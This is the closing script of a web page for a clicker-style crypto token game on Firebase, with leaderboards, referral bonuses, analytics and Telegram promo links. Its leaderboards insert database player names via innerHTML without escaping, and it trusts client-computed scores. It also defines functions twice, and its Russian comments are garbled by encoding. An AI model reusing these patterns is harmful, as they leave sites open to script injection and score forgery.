    auth.onAuthStateChanged(currentUser => {
  if (currentUser) {
    user = currentUser;
    document.getElementById("authSection").style.display = "none";
    document.getElementById("gameSection").style.display = "block";
    loadPlayerData(user.uid);
    checkDailyReward();
    renderTasks();
    startBonusTimer(); // Initialize bonus timer on login
  } else {
    if (bonusTimerInterval) clearInterval(bonusTimerInterval);
    document.getElementById("claimBonusBtn").disabled = true;
    document.getElementById("bonusTimer").innerText = "Sign in to claim";
  }
});



    // —Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤
  /*! db.ref("leaderboard").on("value", snapshot => {
      const data = [];
      snapshot.forEach(child => {
        const entry = child.val();
        if (entry && entry.score !== undefined && entry.name) {
          data.push({
            id: entry.id,
            name: entry.name,
            score: entry.score
          });
        }
      });

      data.sort((a, b) => b.score - a.score);

      const leaderboard = document.getElementById("leaderboard");
      leaderboard.innerHTML = "";

      if (data.length === 0) {
        leaderboard.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
        return;
      }

      data.slice(0, 10).forEach((entry, index) => {
        leaderboard.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
      });
    }, error => {
      console.error("Error loading leaderboard:", error);
      showMessage("Failed to load leaderboard.");
    });!*/



// –°–ª—É—à–∞—Ç–µ–ª—å –¥–ª—è Overall —Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
db.ref("leaderboard").on("value", snapshot => {
  if (currentTab !== "overall") return; // –û–±–Ω–æ–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∞–∫—Ç–∏–≤–Ω–∞ –≤–∫–ª–∞–¥–∫–∞ Overall

  const leaderboardBody = document.getElementById("leaderboardBody");
  const data = [];

  snapshot.forEach(child => {
    const entry = child.val();
    if (entry && entry.score !== undefined && entry.name) {
      data.push({
        id: entry.id,
        name: entry.name,
        score: entry.score
      });
    }
  });

  data.sort((a, b) => b.score - a.score);

  leaderboardBody.innerHTML = "";

  if (data.length === 0) {
    leaderboardBody.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
    return;
  }

  data.slice(0, 10).forEach((entry, index) => {
    leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
  });

  // –í–∏–∑—É–∞–ª—å–Ω–∞—è –æ–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å
  leaderboardBody.classList.add("updated");
}, error => {
  console.error("Error loading leaderboard:", error);
  showMessage("Failed to load leaderboard.");
});


    // –°–ª—É—à–∞—Ç–µ–ª—å –¥–ª—è Weekly Winners —Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
function listenToWeeklyLeaderboard() {
  const weekKey = getWeekKey();
  db.ref(`weeklyLeaderboard/${weekKey}`).on("value", snapshot => {
    if (currentTab !== "weekly") return; // –û–±–Ω–æ–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∞–∫—Ç–∏–≤–Ω–∞ –≤–∫–ª–∞–¥–∫–∞ Weekly

    const leaderboardBody = document.getElementById("leaderboardBody");
    const data = [];

    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score >= 50000 && entry.name) {
        data.push({
          id: entry.id,
          name: entry.name,
          score: entry.score,
          rewardClaimed: entry.rewardClaimed || false
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    leaderboardBody.innerHTML = "";

    if (data.length === 0) {
      leaderboardBody.innerHTML = "<tr><td colspan='4'>No players with 50,000+ tokens this week</td></tr>";
      return;
    }

    data.slice(0, 10).forEach((entry, index) => {
      const reward = getRewardForRank(index + 1);
      const rewardText = entry.rewardClaimed ? `${reward} (Claimed)` : reward;
      leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td><td>${rewardText}</td></tr>`;
    });

    // –í–∏–∑—É–∞–ª—å–Ω–∞—è –æ–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å
    leaderboardBody.classList.add("updated");
  }, error => {
    console.error("Error loading weekly leaderboard:", error);
    showMessage("Failed to load weekly leaderboard.");
  });
}

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–ª—É—à–∞—Ç–µ–ª—è –¥–ª—è Weekly Winners
listenToWeeklyLeaderboard();

    

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ç–∞–±–ª–∏—Ü—ã –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
showTab("overall");

// –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –µ–∂–µ–Ω–µ–¥–µ–ª—å–Ω–æ–≥–æ —Å–±—Ä–æ—Å–∞ –≤ —Ç–∞–±–ª–∏—Ü–µ –ª–∏–¥–µ—Ä–æ–≤ 
setInterval(checkWeeklyReset, 10 * 60 * 1000);

    

    setInterval(() => {
      if (user) {
        updateProfilePanel();
        if (score > 0) submitScore();
      }
    }, 1000);

    const motivationalPhrases = [
      "Click ‚Äî earn tokens.", "Sign in ‚Äî save your progress.", "Your crypto journey starts here.",
      "No account ‚Äî no profit!", "Log in and turn clicks into income!", "The first tokens are always the most valuable.",
      "Top farmers are waiting for you!", "Level up ‚Äî earn even more tokens!", "Crypto wealth starts with a single click.",
      "Skip signing in ‚Äî miss the rewards!"
    ];

    let motiveIndex = 0;
    const motiveElement = document.getElementById("motiveText");

    setInterval(() => {
      motiveElement.style.opacity = 0;
      setTimeout(() => {
        motiveIndex = (motiveIndex + 1) % motivationalPhrases.length;
        motiveElement.innerText = motivationalPhrases[motiveIndex];
        motiveElement.style.opacity = 1;
      }, 500);
    }, 3000);

// –í–Ω—É—Ç—Ä–∏ –≤–∞—à–µ–≥–æ <script> —Ç–µ–≥–∞
window.onload = function() {
    const referrer = document.referrer;
    if (referrer) {
        console.log("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ—à—ë–ª —Å: " + referrer);
        // –ú–æ–∂–Ω–æ –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å —Ä–µ—Ñ–µ—Ä–µ—Ä –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ
     //   showMessage("–ü–µ—Ä–µ—à—ë–ª —Å: " + referrer);
        // –ò–ª–∏ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ Firebase –¥–ª—è –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
        saveReferrer(referrer);
    } else {
        console.log("–†–µ—Ñ–µ—Ä–µ—Ä –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç (–ø—Ä—è–º–æ–π –≤—Ö–æ–¥ –∏–ª–∏ —Å–∫—Ä—ã—Ç)");
      //  showMessage("–†–µ—Ñ–µ—Ä–µ—Ä –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç");
    }
};

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ –≤ Firebase
function saveReferrer(referrer) {
    if (user) {
        const now = new Date().toISOString();
        db.ref("referrers/" + user.uid).push({
            referrer: referrer,
            timestamp: now
        }).then(() => {
            console.log("–†–µ—Ñ–µ—Ä–µ—Ä —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ Firebase");
        }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ—Ñ–µ—Ä–µ—Ä–∞:", error);
        });
    }
}



window.onload = function() {
  const urlParams = new URLSearchParams(window.location.search);
  let referrerUid = urlParams.get('ref');

  // –õ–æ–≥–∏—Ä—É–µ–º –Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ URL
  console.log('Initial URL params:', window.location.search);

  // –ï—Å–ª–∏ referrerUid –µ—Å—Ç—å, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –µ–≥–æ
  if (referrerUid) {
    // –û—á–∏—â–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä ref –∏–∑ URL
    window.history.replaceState({}, document.title, window.location.pathname);
    console.log('URL cleaned, new URL:', window.location.href);

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ URL –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –æ—á–∏—â–µ–Ω
    const newUrlParams = new URLSearchParams(window.location.search);
    if (newUrlParams.get('ref')) {
      console.error('Failed to clean ref from URL in Firefox');
    }

    // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ –ø–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        saveReferrer(referrerUid);
      }
    });
  } else {
    console.log('No referrer detected');
  }
};
  

function saveReferrer(referrerUid) {
  if (!user || !referrerUid || isProcessingReferrer) {
    console.log('Skipping saveReferrer:', { user: !!user, referrerUid, isProcessingReferrer });
    return;
  }

  isProcessingReferrer = true;
  console.log('Processing referrer:', referrerUid);

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ leaderboard
  db.ref(`leaderboard/${user.uid}`).once('value').then(snapshot => {
    const userData = snapshot.val();

    // –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –∏ –±–æ–Ω—É—Å –Ω–∞—á–∏—Å–ª–µ–Ω, –≤—ã—Ö–æ–¥–∏–º
    if (userData && userData.referral_bonus_claimed) {
      console.log('Referral bonus already claimed for this user:', user.uid);
      isProcessingReferrer = false;
      return;
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø—Ä–∏–≥–ª–∞—à–∞—é—â–∏–π
    db.ref(`leaderboard/${referrerUid}`).once('value').then(referrerSnapshot => {
      if (!referrerSnapshot.exists()) {
        console.log('Invalid referrer UID:', referrerUid);
        isProcessingReferrer = false;
        return;
      }

      // –ù–∞—á–∏—Å–ª—è–µ–º 50 —Ç–æ–∫–µ–Ω–æ–≤ –Ω–æ–≤–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
      score += 50;
      showMessage('Referral bonus: +50 tokens!');
      console.log('Referral bonus applied: +50 tokens, new score:', score);
      updateCounterDisplay();

      // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ —Ä–µ—Ñ–µ—Ä–∞–ª–∞
      db.ref(`leaderboard/${user.uid}`).update({
        referrer_uid: referrerUid,
        referral_bonus_claimed: true,
        score: score,
        lastUpdate: Date.now()
      }).then(() => {
        // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ
        db.ref(`referrals/${referrerUid}/${user.uid}`).set({
          invited_at: Date.now(),
          tokens_earned: 0,
          reward_claimed: false
        });
        submitScore();
        console.log('Referrer saved successfully:', referrerUid);
      }).catch(error => {
        console.error('Error saving referrer:', error);
        showMessage('Failed to process referral.');
      }).finally(() => {
        isProcessingReferrer = false;
      });
    }).catch(error => {
      console.error('Error checking referrer:', error);
      isProcessingReferrer = false;
    });
  }).catch(error => {
    console.error('Error checking user data:', error);
    isProcessingReferrer = false;
  });
}
    
  </script>

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-G76GTQQKG0"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-G76GTQQKG0');
  </script>



 <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/TokenCarnivalBot/Carnival?startapp=r_464829483" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Just Three Spins and Get a Bonus!
    </a>
</div>

 <!-- <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/rslite_bot/rsl_app?startapp=RZ8CSrP" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Free Game and Bonus
    </a>
  </div>-->
</body>
</html>
